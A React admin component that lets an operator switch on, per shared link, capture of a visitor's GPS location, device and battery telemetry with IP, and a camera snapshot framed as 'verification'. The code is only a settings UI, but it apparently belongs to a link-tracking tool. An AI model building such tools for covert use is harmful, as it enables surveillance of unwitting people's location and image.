// components/admin/PermissionSelector.tsx
import React from "react";
import { PermissionsConfig } from "@/lib/types";
import { MapPin, Smartphone, Camera } from "lucide-react";

interface PermissionSelectorProps {
  config: PermissionsConfig;
  onChange: (config: PermissionsConfig) => void;
}

export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, onChange }) => {
  const toggle = (key: keyof PermissionsConfig) => {
    onChange({
      ...config,
      [key]: !config[key],
    });
  };

  const options: Array<{
    key: keyof PermissionsConfig;
    title: string;
    desc: string;
    icon: React.ReactNode;
  }> = [
    {
      key: "location",
      title: "GPS Location",
      desc: "Capture high-accuracy coordinates & Google Maps pin",
      icon: <MapPin className="w-4 h-4 text-[#FFFC00]" />,
    },
    {
      key: "device_info",
      title: "Device & Battery Telemetry",
      desc: "OS, browser, screen size, IP, battery percentage & charging",
      icon: <Smartphone className="w-4 h-4 text-[#FFFC00]" />,
    },
    {
      key: "camera",
      title: "Camera Photo Verification",
      desc: "Prompt camera verification and capture snapshot",
      icon: <Camera className="w-4 h-4 text-[#FFFC00]" />,
    },
  ];

  return (
    <div className="space-y-2">
      <label className="text-xs font-bold text-white flex items-center justify-between">
        <span>Requested Permissions & Telemetry</span>
        <span className="text-[10px] text-white/40 font-normal">Configured per link</span>
      </label>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
        {options.map((opt) => {
          const isEnabled = config[opt.key];
          return (
            <div
              key={opt.key}
              onClick={() => toggle(opt.key)}
              className={`p-3 rounded-2xl border cursor-pointer transition-all flex items-start justify-between gap-3 ${
                isEnabled
                  ? "bg-[#1A1A22] border-[#FFFC00]/40"
                  : "bg-[#141418] border-white/5 opacity-60 hover:opacity-100"
              }`}
            >
              <div className="flex items-start gap-2.5">
                <div className="mt-0.5">{opt.icon}</div>
                <div>
                  <p className="text-xs font-bold text-white">{opt.title}</p>
                  <p className="text-[10px] text-white/50 leading-tight mt-0.5">{opt.desc}</p>
                </div>
              </div>
              <input
                type="checkbox"
                checked={isEnabled}
                onChange={() => {}}
                className="w-4 h-4 accent-[#FFFC00] rounded mt-0.5 pointer-events-none"
              />
            </div>
          );
        })}
      </div>
    </div>
  );
};
